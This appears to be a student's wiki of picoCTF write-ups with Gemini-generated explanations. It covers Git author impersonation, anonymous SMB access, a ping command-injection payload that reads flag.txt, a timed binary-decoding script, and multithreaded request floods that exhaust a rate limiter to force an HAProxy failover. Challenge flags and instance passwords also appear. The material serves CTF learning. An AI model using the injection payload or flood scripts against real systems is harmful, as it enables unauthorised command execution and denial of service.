# Bunny CTF — Lark Wiki 本地副本
# 来源: https://zcpj3avuhsr.sg.larksuite.com/wiki/SQRUwEoE0iR0Ykkuc47lvddng3c
# 文档 obj_token: K0F7dBMeBonNO9xFXJKl5ClYgGb
# 最后同步: 2026-06-17 02:12:19
# -------------------------------------------------------

Bunny CTF
Template:
0 detective story
Role & Objective You are a veteran cyber detective mentoring a 15-year-old rookie. Your task is to transform my raw technical notes from a CTF (Capture The Flag) challenge into an engaging, structured "Cyber Detective Case File."
The Output Structure Please organize the story using the following exact sections. Map my raw notes to these questions:
The Crime Scene (State): Where was the target (the Flag) hidden? Describe the initial state of the system or network. (Maps to Q1)
The Hacker's Trap (Bottleneck): What were the tricky parts, special mechanisms, or anti-reconnaissance traps set by the challenge creator? (Maps to Q2)
The Deduction Flow (Logic): How did we logically connect the clues to successfully bypass the trap and capture the flag? (Maps to Q3)
The Detective Toolkit (Commands): What exact terminal commands or tools did we use to trigger the solution? (Maps to Q4)
The Dead Ends (Mistakes): Which wrong paths did we explore, and what smoke screens misled us before we found the right track? (Maps to Q5)
Strict Rules for Generation
Technical Precision: The narrative must NOT alter any terminal commands, IP addresses, or technical syntax. Present all code/commands in markdown code blocks.
Mental Model: Use the "State-Machine" mental model implicitly. Focus on how our actions changed the state of the "Crime Scene" (e.g., from 'locked' to 'open port', from 'modified file' to 'committed timestamp').
Tone: Keep it engaging and logical, like a mystery novel, but prioritize clarity over excessive metaphors. Do not treat the reader like a child; treat them like a junior partner.
Input Data Here are my raw notes from the recent CTF challenge: [Insert your raw notes, Q1-Q5 rough answers, and terminal logs here]
1 learning material
write a learning material:Q1: Where was the flag hidden?Q2: What were the "specialy" or "tricky" parts of this challenge? Q3: How did we successfully get the flag?Q4: What commands did we use?Q5 any mistake or wrong path did we explore


Cheat:
Gemini browser_agent


Luna Status 2026 June 17
image.png

Apr 12 my GIT
https://play.picoctf.org/practice/challenge/764
image.png

Author: Darkraicg492DescriptionI have built my own Git server with my own rules!You can clone the challenge repo using the command below.git clone ssh://git@foggy-cliff.picoctf.net:55400/git/challenge.gitHere's the password: e38a0906Check the README to get your flag!  --help me get the ctf
Identity Configuration
The challenge required the commit to come from a specific user. I updated the local Git configuration so that any action I took would be signed as "root":
git config user.name "root"
git config user.email "root@picoctf"
Going to Readme
We had to go to challenge's readme.
Creating the Trigger
I created a file named flag.txt. In this specific challenge, the content of the file doesn't matter; the act of pushing a file named flag.txt as the "root" user is the "key" that unlocks the real flag.
echo "trigger" > flag.txt
Staging and Committing
I added the new file to the Git index and created a commit message to finalize the change locally:
git add flag.txt
git commit -m "pushing flag"
Pushing to the Remote Server
I sent the local commit to the remote repository. When prompted, I entered the password you provided (d3d09b5e):
git push origin master
Capturing the Flag
Once the server verified that the "root" user had pushed a change, it automatically printed the real flag in the terminal output:
Flag found: picoCTF{mp3r50n4t4_g17_345y_6877715a}
Final Submission
The last step was to take that flag string, paste it into the Submit Flag box on the picoCTF website, and click Submit.
Apr 19
https://play.picoctf.org/practice/challenge/762
image.png

The Feynman Technique: MVK Analysis
Concept 1: Data Identity (ASCII vs. Hexadecimal vs. Decimal)
The Analogy: Imagine a spy. He has a physical face (the letter e). When he travels to the Decimal country, his passport says 101. When he travels to the Hexadecimal country, his passport says \x65. No matter which passport you read, the physical face standing in front of you is the exact same.
The "Why": The server code says if user_input == "\x65"*1751. The computer reads \x65 (Hexadecimal) and instantly translates it to the physical face: the character e. It does not want the literal numbers "1", "0", "1". It wants the character that those numbers represent.
Concept 2: String Multiplication (Literal Duplication)
The Analogy: If you tell a factory machine "Lego Block times 3", it does not print the words "Lego Block Lego Block Lego Block" on a piece of paper. It physically snaps three plastic Lego blocks together.
The "Why": In Python, "\x65"*1751 means taking the character e and snapping it together 1,751 times to create one massive, unbroken chain. The input() function reads whatever you pipe into the server. If the input chain exactly matches the server's chain of 1,751 es, it opens the lock.
The Post-Mortem Principles
Keep:
Decoupled Payload Delivery: The architectural choice to use a pipeline (python3 -c ... | nc ...) separates the data generation (the script) from the data transmission (the network connection). This remains the correct structural approach for bypassing manual input limits.
Stop:
Altering Variables Based on Prompt Semantics: The text prompt said "ASCII DECIMAL 101", leading to a mid-session pivot to send the literal string '101'. The failure of manual inputs (e.g., ASCIIDECIMAL101*1751) was a syntax failure, not a sign that the fundamental data type (the character e) was wrong. Do not abandon the correct underlying variable because of a formatting error.
Start:
Source-Truth Mapping: When operating against an automated system, prioritize the source code's evaluation logic (\x65) over the text prompt's instructions ("DECIMAL 101"). Map the encoding explicitly (Decimal 101 = Hex \x65 = Char 'e') as the primary premise before generating any payload.
__________________________________________________________________________________________
The Tricky Part
We don't use 101, /x65. We use e. We need to do it 1751 times.
Apr  26/26
Gemini:
In this session, we acted as a Vibe Coding team to solve a cybersecurity challenge called "Printer Shares." Here is the breakdown of the "Minimum Viable Knowledge" (MVK) and the principles we distilled from the process.

The Feynman Technique: MVK Analysis
Imagine you are a 12-year-old student exploring how computers talk to each other.
The Core Concept: The "Public Bookshelf" (SMB Shares)
Imagine a giant library where most books are locked behind glass. However, there is one specific bookshelf in the corner labeled "Community Magazines." Anyone can walk up, look at what’s there, and even take a copy home without needing a library card.
In the technical world, this is called an SMB Share.
The Printer is like the library.
The Share (print$) is that public bookshelf.
The "Why" it worked: Often, when people set up network printers, they leave a "bookshelf" open so that anyone on the network can easily send documents to print. We simply used a tool called smbclient to act as our "eyes" to look at that bookshelf, found a "magazine" (the flag.txt file) that shouldn't have been left there, and read it.

The Post-Mortem Principles
"The trip is over, but the photos remain as lessons."
KEEP: The "Specific Tool + Port" Prompting
Why: You provided the exact IP/URL and port (49387) immediately. This skipped the "guessing phase" and allowed the AI to jump straight into protocol analysis (like trying nc or smbclient).
Retain: Always provide the target address and debug info in the first prompt. It acts like giving a GPS coordinate instead of just saying "I'm lost in the woods."
STOP: The "Manual Step" Hand-off
Why: Initially, we spent time discussing the theory of what might be there (CUPS vs. IPP vs. SMB). While helpful for learning, it delayed the "Vibe" of the build/solve.
Fix: Instead of asking "what could this be?", start with a Broad Action Sweep. For example: "Scan this port for common printer protocols and show me the output." This moves from "Thinking" to "Doing" faster.
START: The "State-Machine" Mental Model
Why: When the first attempt at a task didn't immediately show the flag, we had to re-run the logic.
Next Time: Adopt the mental model of "Probe, Pivot, Proceed." 1.  Probe: Check if the door is open (is the port active?).
 Pivot: If it's a printer port, try printer-specific languages (SMB/IPP).
 Proceed: Once you see a file list, download everything immediately.
Action: Treat the AI as an Agentic Scout. Instead of asking it to "help me solve," ask it to "exhaustively list all accessible files on this specific service."
Me: 
Where is the flag?
In flag.txt where the print$ is.
What command did you use to get the flag?
We used smbclient commands (ex: smbclient -L //mysterious-sea.picoctf.net -p 49387 -N).
It allowed us to log in with "No password" / anonymous access.


Wayne's Gemini:

Q1: Where was the flag hidden?
Answer: The flag was stored on a remote server acting as a Print Server. It was located within an SMB (Server Message Block) share named shares. Inside that share, the flag was in a plain text file named flag.txt.
Q2: What were the "tricky" parts of this challenge?
Answer: There were three main technical hurdles:
Non-standard Port: SMB services usually run on port 445. This challenge used port 53876. Standard connection attempts would fail unless you manually specified this port.
Anonymous Access (Null Session): The server was configured to allow "Anonymous" or "Guest" logins. This meant you could bypass the username/password requirement using the -N flag in smbclient.
Discovery (Enumeration): The share name wasn't obvious. You had to first "enumerate" (list) all the shares on the server to find that the target directory was actually named shares.
Q3: How did we successfully get the flag?
Answer: We followed a standard penetration testing workflow:
Reconnaissance: We queried the server to see what it was sharing.
Access: We connected to the specific shares folder using a guest login.
Extraction: We listed the directory contents, identified flag.txt, and used the cat command to display the flag's content directly in the terminal.

Q4: What commands did we use?

The Final Flag: picoCTF{mb_pr1nter_5n4re5_51f37693}

May 3/26
https://play.picoctf.org/practice/challenge/757
Gemini
Me:
Where was the flag hidden?
In a remote server where flag.txt was.
What were the "tricky parts"? 
You had to do cat flag.txt instead of ls. Big mistak the first time
How did we succesfully get the flag?
We used the given command first, then enter 8.8.8.8;cat flag.txt.
What commands did we use?
We used these commands:
(Note: # = the code that you got)
nc mysterious-sea.picoctf.net #
8.8.8.8; cat flag.txt
; V.S |
Semicolon (;) - Sequential Execution
Mechanism: Executes multiple commands in a sequence, from left to right.
Variable Relationship: The execution of Command B is independent of Command A. Command B will execute regardless of whether Command A succeeds, fails, or crashes. The output of Command A is not shared with Command B.
Execution Flow: Command A → finishes → Command B
Example: ping 8.8.8.8 ; ls
The system runs the ping command.
Once ping terminates, the system independently runs ls.
Pipe (|) - Data Stream Transfer
Mechanism: Connects the standard output (stdout) of the first command directly into the standard input (stdin) of the second command.
Variable Relationship: Command B strictly depends on the data generated by Command A. The two commands are coupled by the data stream.
Execution Flow: Output of Command A → fed into → Command B
Example: ls | grep "flag"
ls gathers the list of files in the directory.
Instead of printing to the screen, that text output is piped directly into grep.
grep processes that specific text stream to find the string "flag".



Wayne's Gemini:
Q1: Where was the flag hidden?
The flag was hidden in a file named flag.txt located in the current working directory of the remote server.
Q2: What were the "tricky" parts of...
The "tricky" part was bypassing the input restriction. The prompt explicitly states, "We have tight security because we only allow '8.8.8.8'". The challenge is realizing that the server likely uses a basic script (like the script.sh seen in the directory) that simply appends your input to a ping command without properly escaping or validating it for command injection.
Q3: How did we successfully get the... (flag)?
We achieved this via command injection.
We first used 8.8.8.8 | ls to confirm the presence of files, revealing flag.txt and script.sh.
We then used the payload 8.8.8.8; cat flag.txt.
The server executed the ping command (which succeeded), and the semicolon (;) told the shell to then execute the next command, cat flag.txt, which outputted the flag: picoCTF{p1nG_c0mm@nd_3xpL0iT_su33EssFuL_8555bda7}.
Q4: What commands did we use?
Based on the terminal history, the following commands were used:
nc mysterious-sea.picoctf.net 61915 (to connect to the challenge server)
8.8.8.8 (initial test)
8.8.8.8 | ls (to list directory contents)
8.8.8.8; cat flag.txt (the successful payload to read the flag)
^C (Ctrl+C, used to interrupt and exit previous sessions)



May 9
https://learn.cylabacademy.org/library/754?page=1&difficulty=2

Luna's Gemini
Q1: Where was the flag hidden?
The flag was hidden inside a dynamically generated binary executable that was delivered to the terminal as a continuous stream of hexadecimal characters. Specifically, the flag was embedded as a plaintext string within the data segment of that binary.
Q2: What were the "tricky" parts of this challenge?
Time Constraint: The server imposed a strict 1-second execution window. Manual decoding was impossible because the connection would time out before a human could process the data.
Dynamic Nature: Every time a connection was made, the server generated a new binary with a different secret, meaning you couldn't reuse a previous answer.
Ephemeral Instances: The challenge ports (like 57056 or 58790) expired quickly, requiring us to update the automation script multiple times to match the active instance.
Q3: How did we successfully get the flag?
We succeeded by using automation. We wrote a Python script that:
Opened a socket connection to the server.
Buffered the incoming hex stream until it reached the prompt.
Used Regular Expressions (Regex) to instantly find the flag pattern (picoCTF{...}) or the specific hex offset containing the secret.
Sent the answer back to the server automatically within milliseconds.
Q4: What commands did we use?
nc mysterious-sea.picoctf.net [port]: To manually connect to the challenge and see the hex stream.
cat << 'EOF' > solve.py: To write the Python automation script directly to the terminal without using a manual editor.
python3 solve.py: To execute the automation logic.
pip install pwntools: To install the library used for advanced socket handling and binary parsing.
Ctrl + C: To terminate stuck processes and return to the base shell.
Q5: Any mistakes or wrong paths explored?
Manual Decoding Attempt: Initially, we tried to decode the hex manually, but it "wasn't working" because the server-side timer expired before the answer could be submitted.
Inputting Commands into the Binary: We briefly attempted to run python3 solve.py while the challenge binary was still running (at the "What's the secret?" prompt). This failed because the binary treated the command as a literal text answer rather than a system command.
Connection Errors: We encountered several ConnectionRefusedError messages because we tried to run the script against ports that had already timed out and closed on the server side.
Luna
Q1: Where was the flag hidden?
The flag was hidden in the remote server of mysterious-sea.picoctf.net and its flag.txt.
Q2: What were the "tricky" parts of this challenge? 
Gemini kept getting the wrong port number and first thought we had to directly copy the code (as seen under one second). The least tricky part was getting the flag and the submission part on time.
Q3: How did we successfully get the flag?
We successfully obtained the flag by running solve.py with the correct port number, using the command python3 solve.py.
Q4: What commands did we use?
We used the command in the solve.py.
Q5 any mistake or wrong path did we explore
The AI forgot the correct port number for solve.py, so we kept getting errors.
solve.py
Line 1 of solve.py tells it to start writing everything into solve.py until it hits the EOF.

Line 2 imports sys, socket, and struct, which are basically our libraries.

Line 3 creates a new network socket to communicate with the remote server.

Line 4 connects to the challenge server and port.

Line 5 uses the socket to make sure that it can be read from and written to easily with no delay.

Line 6 initializes an empty buffer and starts a loop.

Line 7 reads 4,096 bytes of data from the server.

Line 8 tells the loop to stop when there is no data, acting like a stop sign.

Line 9 adds the new data to the buffer.

Line 10 checks if the flag or flag.txt has appeared in the buffer.

Line 11 tells it to print the flag with a pattern to the screen.

Line 12 checks if the server is asking for a secret.

Line 13 searches the buffer for a long string of hexadecimal characters, which can look like another language.

Line 14 tells it to proceed to the next step if a hex dump is found.

Line 15 looks for a certain pattern followed by eight hex characters that contain the secret value.

Line 16 tells it to extract the value if found.

Line 17 converts the eight hex characters from the format to a standard integer.

Line 18 sends the standard integer back to the server with a newline character.

Line 19 clears the buffer for the next round.

Line 20 prints an error message if there was a failure.

Line 21 tells it to exit if it fails.

Line 22 signals the end.
Simplified:
First, connect to remote server.
Create a file object for easier interaction.
Read the incoming data from the remote server.
If the flag is found, extract and print it.
If the server asks, "What's the secret?" find the hex dump:
 Find the large block of hexadecimal data from the bunch.
 Look for the specific pattern.
Convert the 8-character hex value to another integer.
Send the answer back to the remote server.
Clear the buffer for the next challenge.
Wayne's Gemini: CTF Challenge Reverse Engineering Log
Q1: Where was the flag hidden?
Intermediate Secrets: Hidden inside the .text section of dynamically generated ELF binaries transmitted as hex streams. Specifically, the secret was an integer hardcoded in a local variable assignment instruction: mov DWORD PTR [rbp-0x4], <secret_value>.
Final Flag: Held on the remote server (mysterious-sea.picoctf.net). It is only transmitted to the client after successfully answering the intermediate "secrets" for multiple consecutive binaries.
Q2: What were the "tricky" parts of this challenge?
Time Constraint: A strict 1-second execution window per binary payload.
Dynamic Payload: The server generates a new binary with a different secret integer upon every connection and every successful iteration.
Data Representation: The binary is delivered as a continuous stream of hexadecimal characters rather than a downloadable file, negating the use of standard GUI reverse engineering tools (like IDA or Ghidra) in real-time.
Q3: How did we successfully get the flag?
The challenge was resolved by shifting from manual analysis to an automated Exploit (Scripting) via socket programming.
Prerequisite: Identified the fixed opcode pattern c7 45 fc (mov [rbp-0x4]) which consistently precedes the target integer in the binary structure.
Execution Structure:
Establish a direct socket connection to the server.
Buffer the incoming hexadecimal stream.
Use regular expressions (c745fc([0-9a-f]{8})) to pinpoint the opcode and capture the subsequent 8 hex characters (4 bytes).
Convert the captured hex string from Little-Endian format to a base-10 integer (struct.unpack('<I', ...)).
Transmit the integer back to the server within the 1-second window.
Loop this process until the stream contains the terminal picoCTF{...} format.
Q4: What commands did we use?
Reconnaissance: nc mysterious-sea.picoctf.net 58790
Script Generation (via Web Shell):
Bash

cat << 'EOF' > solve.py
import socket, re, struct
s = socket.socket()
s.connect(('mysterious-sea.picoctf.net', 58790))
f = s.makefile('rwb', buffering=0)
buf = b''while True:
    d = f.read(4096)
    if not d: break
    buf += d
    if b'picoCTF{' in buf:
        print('\nFLAG: ', re.search(b'picoCTF\\{.*?\\}', buf).group(0).decode())
        breakif b"What's the secret?:" in buf:
        h = re.search(b'([0-9a-f]{500,})', buf)
        if h:
            v = re.search(b'c745fc([0-9a-f]{8})', h.group(1))
            if v:
                val = struct.unpack('<I', bytes.fromhex(v.group(1).decode()))[0]
                f.write(str(val).encode() + b'\n')
                buf = b''else:
                print('Pattern not found')
                break
EOF
Execution: python3 solve.py
Q5: Any mistake or wrong path did we explore?
Manual Interaction: Attempting to manually copy the hex dump, decode it, and paste the result. Variable failure: The 1-second timeout mechanism strictly invalidates human-speed responses.
Static Flag Submission: Submitting a previously observed or guessed flag (picoCTF{bytemancy_0_b8e94030}) directly into the prompt. Variable failure: The validation mechanism requires the specific mathematical answer to the immediate binary's challenge, not the final flag string itself, and the state resets on failure.
May 10 Flag One: https://learn.cylabacademy.org/library/740?page=1&difficulty=1 (Family)
https://docs.google.com/document/d/1TIoKQChnfIY5eBNqnp1HnACf5MOZFFNXE1bO30sR2rY/edit?tab=t.a9o97c1eel70#heading=h.7l248mda8pk
Luna
Today we had to hack into an account. Then we forced some code and zipped the three parts together to get the flag.

Luna's Gemini
Q1: Where was the flag hidden?
The flag was stored in a text file named flag.txt. This file was compressed inside a password-protected zip archive. The zip archive itself was initially fragmented into five separate pieces (part_aa, part_ab, part_ac, part_ad, part_ae) located in the home directory of the remote server.
Q2: What were the "tricky" parts of this challenge?
SSH Syntax Requirements: Connecting required specific parameter formatting (the -p flag for the port) and strict lowercase execution.
Hidden Input Mechanism: Linux terminal password inputs do not display keystrokes or cursor movement. This masks visual feedback during both the SSH login phase and the unzip password prompt.
Host Key Verification: The initial SSH connection paused the execution flow, requiring a manual yes input to verify the server's fingerprint before the password prompt would appear.
File Fragmentation: The archive could not be extracted in its default state; the fragmented file parts had to be concatenated into a single, valid .zip file first.
Q3: How did we successfully get the flag?
Executed the SSH command with the precise port, user, and host parameters.
Passed the host key verification and authenticated using the provided remote password.
Listed directory contents to locate the necessary files.
Read the instructions file to identify the extraction method and the archive password (supersecret).
Concatenated the file fragments into a unified archive named combined.zip.
Extracted the unified archive using the discovered password.
Output the contents of the extracted flag.txt file to the terminal screen.
Q4: What commands did we use?
ssh -p 52139 ctf-player@dolphin-cove.picoctf.net (Initiate remote connection)
yes (Accept host fingerprint)
ls (List directory contents)
cat instructions.txt (Read instruction parameters)
cat part_* > combined.zip (Concatenate fragments and redirect output to a new file)
unzip combined.zip (Extract archive)
cat flag.txt (Read final output)
Q5: Any mistake or wrong path did we explore?
The initial terminal execution failed due to incorrect syntax variables. The errors prior to connection included entering the host address directly without the command, using an uppercase SSH binary call, and attempting to append the port using a colon instead of the required -p parameter. Once the syntax was corrected and the connection was established, the execution followed a linear path without exploring incorrect directories or files.



Wayne's Gemini


Piece by Piece by Old Fish
https://gemini.google.com/share/2d49f230de23
Challenge Review: Piece by Piece
This challenge focused on file integrity, archive manipulation, and password recovery within a Linux environment. Below is a breakdown of the learning points from this exercise.

Q1: Where was the flag hidden?
The flag was stored inside a file named flag.txt. However, this file was not directly accessible. it was compressed inside a Zip archive that had been split into multiple smaller chunks (parts) to prevent immediate extraction.
Q2: What were the "tricky" parts of this challenge?
Several layers of obfuscation were used to slow down the process:
File Fragmentation: The archive was broken into parts (e.g., part_aa, part_ab). A user cannot extract a single part; they must be perfectly reassembled first.
Misleading Extensions: The combined file was named with a .tar.gz extension, which usually suggests a Gzip-compressed Tarball. However, the internal structure was actually a Zip archive, requiring unzip rather than tar.
Encryption: The final archive was password-protected, requiring the user to locate a "secret" string from the environment rather than using the SSH login credentials.
Q3: How did we successfully get the flag?
The solution followed a linear logical path:
Reassembly: Using cat to merge the data chunks into a single cohesive binary.
Identification: Using the file command to ignore the filename extension and see the actual data type (Zip).
Extraction: Running unzip and providing the password found within the environment (or via the strings command) to release flag.txt.
Q4: What commands did we use?


Q5: Mistakes or "Wrong Paths" explored
Trusting the Extension: Attempting to use tar -xvzf because the file ended in .tar.gz. This fails because the underlying "magic bytes" of the file don't match the command.
Incorrect Password Loop: Attempting to use the SSH password (f3b61b38) for the archive. This is a common trap in CTFs where users assume one password fits all locks.
The "Unzip Trap": Getting stuck in the unzip password prompt loop. Beginners often try to type exit or quit into the password field instead of using Ctrl+C to kill the process.

Key Takeaway: In Linux forensics and CTFs, never trust the filename. Always verify the file type using file and check the surrounding environment for hidden strings or notes.

May 10 Flag two :https://learn.cylabacademy.org/library/756?page=1&difficulty=2(Family)
Luna
We had to hack the system by flooding it with a lot of stuff (solve.py)
And with python3 solve.py two times, the flag
solve.py

import requests
from concurrent.futures import ThreadPoolExecutor

url = "http://mysterious-sea.picoctf.net:64151/"

def make_request(i):
    try:
        r = requests.get(url)
        # If we see the flag format, print it
        if "picoCTF{" in r.text:
            print(f"\n[!] FLAG FOUND: {r.text.strip()}")
            return True
    except:
        pass
    return False

print("Starting flood to trigger failover...")
# Using 50 threads to hit the limit quickly
with ThreadPoolExecutor(max_workers=50) as executor:
    # Send more requests than the limit (e.g., 400 if limit is 300)
    results = list(executor.map(make_request, range(400)))

if not any(results):
    print("Done. If no flag appeared, try increasing the range or max_workers.")
 
The first two lines are importing the requests library and ThreadPoolExecutor. The third line defines the target URL. 

Next, the code handles the request and sends the GET request to the load balancer. When the flag is located on the backup server rather than the primary, and the primary server is overwhelmed, the load balancer redirects the traffic to the backup server and ignores any connection errors that might occur during the flood.

Key details of the process:
It uses 50 concurrent threads to hit the server's health check limit quickly.
It simulates high traffic to make the primary server appear unhealthy.
The next line sends 400 requests; if the limit is 300, sending 400 ensures that the limit is crossed.
Finally, during the flood, the flag will appear.
Luna's Gemini
Here is a breakdown of the challenge logic and the steps we took to solve it.
Q1: Where was the flag hidden?
The flag was stored in an environment variable on a backup server. In a standard state, the load balancer (HAProxy) only directed traffic to the primary server, which did not have the flag. The backup server only became accessible when the primary server was deemed "unhealthy."
Q2: What were the "tricky" parts of this challenge?
The "trick" relied on a specific interaction between the application code and the load balancer configuration:
The Status Code Swap: Normally, rate limiting returns a 429 Too Many Requests. This application was specifically coded to return a 503 Service Unavailable instead.
The Health Check: HAProxy treats a 503 as a sign that a server is down. By intentional design, the application used its rate limiter to "fake" a system failure.
Failover Logic: You couldn't just access the backup server directly; you had to mathematically force the system to switch tracks.
Q3: How did we successfully get the flag?
We performed a Rate Limit Exhaustion attack to trigger a Failover:
We identified the global limit of 300 requests per minute.
We used a multi-threaded script to send over 300 requests almost simultaneously.
The primary server reached its limit and started responding with 503 errors.
HAProxy saw these 503 errors, assumed the primary server had crashed, and routed our remaining requests to the backup server.
The backup server, seeing the request, executed the code if os.getenv("IS_BACKUP") == "yes": and returned the flag.
Q4: What commands did we use?
In the terminal/webshell, we primarily used:
curl -I [URL]: To check the initial server headers and connectivity.
nano solve.py: To write the Python script that automated the high-volume requests.
python3 solve.py: To execute the attack.
The Python script itself utilized the requests library for communication and concurrent.futures.ThreadPoolExecutor to handle the speed required to hit the limit.
Q5: Any mistake or wrong path did we explore?
In this specific session, we moved directly to the solution because we identified the 503 error handler in the application code immediately. However, a common "wrong path" in this challenge would be:
Manual Refreshing: Trying to refresh the browser 300 times manually. This is too slow; the "per minute" window is rolling, so the requests must be concentrated.
Assuming a 429 Error: A common mistake is thinking the server is just blocking you. If the code hadn't swapped the error to a 503, the load balancer would never have switched to the backup server, and the attack wouldn't work.



Wayne's Gemini
Here is a structured learning breakdown of the "Failure Failure" challenge, detailing the mechanics, execution, and key takeaways.
Learning Material: Failure Failure Challenge

Q1: Where was the flag hidden?
The flag was hidden on the backup server (s2).
The application code (app.py) contained a conditional statement checking an environment variable: if os.getenv("IS_BACKUP") == "yes":. The primary server (s1) did not have this set, meaning it would always return "No flag in this service". The only way to access the flag was to force the HAProxy load balancer to route our traffic to the backup server.
Q2: What were the "tricky" parts of this challenge?
This challenge elegantly combined infrastructure misconfiguration with application logic. The tricky elements included:
The Global Rate Limiter: The Flask application used a custom global_rate_limit_key returning a static "global" string. This meant the limit (300 requests per minute) was shared across all requests, not tied to a specific IP address.
Health Check Sabotage: HAProxy was strictly configured with http-check expect status 200. When the rate limit was hit, the app returned a 503 Service Unavailable. HAProxy interpreted this expected application behavior as a critical server failure.
The Race Condition (Timing): HAProxy was configured with inter 2s fall 2. This meant we had to hit the server fast enough to exhaust the 300-request limit within 60 seconds, and then wait exactly long enough (at least 4 seconds) for HAProxy to poll the server twice, see the 503s, and mark it DOWN.
State Isolation: We had to rely on the fact that Flask-Limiter defaults to in-memory storage. If s1 and s2 had shared a Redis instance for rate-limiting, "killing" s1 would have also locked us out of s2.
Q3: How did we successfully get the flag?
We deliberately triggered a failover by performing an intentional, localized Denial of Service (DoS) against the primary server's rate limiter.
By blasting the endpoint with over 300 concurrent requests, we exhausted the global quota. The primary server began returning 503 status codes. We then paused for 5 seconds—just long enough for HAProxy's health checks to fail twice (fall 2). When we sent our final, regular request, HAProxy determined s1 was dead and cleanly routed us to s2, delivering the flag.
Q4: What commands did we use?
We used a one-line bash script executed directly in the challenge's Webshell terminal:
Bash

for i in {1..330}; do curl -s -o /dev/null http://mysterious-sea.picoctf.net:49355/ & done; sleep 5; curl -s http://mysterious-sea.picoctf.net:49355/
{1..330}: Ensures we comfortably breach the 300-request limit.
&: Pushes each curl command to the background, creating a massive concurrent burst.
sleep 5: Provides the exact window needed for HAProxy to register the failure.
The final curl: Retrieves the payload from the newly activated backup server.
Q5: Any mistake or wrong path did we explore?
The Synchronous Trap: Our initial theoretical approach was to use a simple, sequential loop (for i in {1..400}; do curl ... done). This was a mechanical trap. Network requests take time. If each synchronous request took even 0.2 seconds, 300 requests would take 60 seconds. By the time we reached request 300, the rate-limiter's 1-minute window would have started resetting, meaning we would never actually hit the ceiling. We corrected this by injecting the & operator to background the tasks, transitioning from a slow serial crawl to an instantaneous concurrent spike.

Failure Failure by Old Fish
Q1: Where was the flag hidden?
The flag was located on the backup (secondary) server behind the HAProxy load balancer.
Premise: In a High Availability (HA) configuration, the backup server remains entirely inaccessible to clients as long as the load balancer registers the primary server as "healthy" (UP).
Q2: What were the "tricky" parts of this challenge?
The core difficulty lies in the architecture masking the target. Key structural points include:
Infrastructure vs. Application: The solution requires attacking the network infrastructure logic (the load balancer's state machine) rather than searching for application-layer vulnerabilities (like SQL injection or broken access control) on the primary server.
The Concurrency Variable: Standard, sequential enumeration tools or manual browser refreshes are insufficient. The failover condition relies on a specific threshold of simultaneous connections or requests per second being exceeded.
Q3: How did we successfully get the flag?
We manipulated the load balancer's routing table by artificially triggering a failure state on the primary server.
Mechanism Breakdown:
Flood: We generated a high volume of concurrent HTTP requests directed at the load balancer.
Exhaustion: The primary server hit a predefined limit (e.g., connection limits or request rate limits), causing it to respond with HTTP server errors (like 503 Service Unavailable).
Failover: HAProxy's health-check mechanism registered these errors, marked the primary server as "DOWN", and automatically rerouted our ongoing traffic stream to the backup server.
Retrieval: The backup server processed the routed requests and returned the payload containing the flag.
Q4: What commands did we use?
We utilized a combination of shell commands to execute the concurrent request flood:
Bash

seq 400 | xargs -I {} -P 50 curl -s URL | grep "picoCTF{"
Variable Relationship:
seq 400: Determines the total volume of requests.
-P 50 (via xargs): Dictates the concurrency level (50 simultaneous connections). This is the critical variable that forces the server exhaustion.
curl -s: Executes the HTTP GET request.
grep "picoCTF{": Filters the output stream, discarding the primary server's errors and isolating the flag returned by the backup server.
Q5: Any mistake or wrong path did we explore?
Based on our direct execution, we bypassed initial wrong paths, but in the context of this specific architecture, common missteps include:
Sequential instead of Concurrent Execution: Writing a script that sends requests one by one. If the primary server resolves sequential requests faster than the rate limit threshold, the failover state is never triggered.
Application-Layer Tunnel Vision: Spending time analyzing the provided application code for logic flaws, hidden endpoints, or input validation bypasses, ignoring the provided HAProxy configuration file which signaled the actual attack surface.
Missing the Output Filter: Running the flood without grep. This results in the terminal being overwhelmed by 503 error HTML/text, making it highly probable to visually miss the single successful flag response buried in the output.


Bonus:
haproxy.cfg

# global settings define process-wide parameters
global
    # send logs to stdout, useful for containerized environments (Docker/K8s)
    log stdout format raw local0
    # limit maximum simultaneous connections to 1000
    maxconn 1000

# default settings applied to all subsequent frontend/backend sections
defaults
    log global
    # operate at Layer 7 (HTTP), allowing header inspection and switching
    mode http
    # time to wait for a successful connection to a server
    timeout connect 5s
    # maximum inactivity time on the client side
    timeout client 10s
    # maximum inactivity time on the server side (response time)
    timeout server 10s
    
# defines the entry point for incoming traffic
frontend http-in
    # listen on port 80 across all network interfaces
    bind *:80
    # forward all traffic to the 'servers' backend by default
    default_backend servers

# defines the cluster of servers to receive forwarded traffic
backend servers
    # use HTTP-based health checks instead of simple TCP pings
    option httpchk GET /
    # consider the node healthy only if it returns a 200 OK status
    http-check expect status 200
    
    # Primary server: checked every 2s, 2 failures to go DOWN, 3 successes to go UP
    server s1 *:8000 check inter 2s fall 2 rise 3
    
    # Hot standby: only receives traffic if s1 is DOWN (Active-Passive setup)
    server s2 *:9000 check backup inter 2s fall 2 rise 3
Server code: app.py

from flask import Flask, render_template
from dotenv import load_dotenv
from flask_limiter import Limiter
import os

# Load environment variables from a .env file into os.environ
load_dotenv()

app = Flask(__name__)

# Custom key function that returns a constant string.
# This ensures the rate limit is shared across all users (global) 
# rather than being tracked per individual IP address.
def global_rate_limit_key():
    return "global"

# Initialize the Flask-Limiter extension.
# default_limits applies the restriction to all routes unless overridden.
limiter = Limiter(
    key_func=global_rate_limit_key,
    app=app,
    default_limits=["300 per minute"]
)

# Global error handler to catch '429 Too Many Requests' exceptions.
# Returns a 503 status code to signal service unavailability to the load balancer.
@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503

@app.route('/')
# Explicitly redundant limit for the home route (matching the default).
@limiter.limit("300 per minute")
def home():
    # Retrieve environment variables to determine node behavior
    print("value:", os.getenv("IS_BACKUP"))
    
    # Conditional logic based on whether this instance is designated as the backup node
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
        
    # Pass the result to the HTML template for rendering
    return render_template("index.html", flag=flag)
May 11
#1
It was tricky until antigravity came. Antigravity tried all 25 shifts and found that shift 16 was the only one that made sense. CIPHER has 25 shifts. Each time, the letter moves the # of shifts to the next letter.
Antigravity
Viewed data.enc:1-2
Ran command: python -c "c='mbyccsxqdrobelsmyxigfknnoo'; print('\n'.join([f'Shift {i:2}: ' + ''.join([chr((ord(x)-97+i)%26+97) for x in c]) for i in range(1,26)]))"

我已经查看了 data.enc 文件，里面包含的内容是：
picoCTF{mbyccsxqdrobelsmyxigfknnoo}

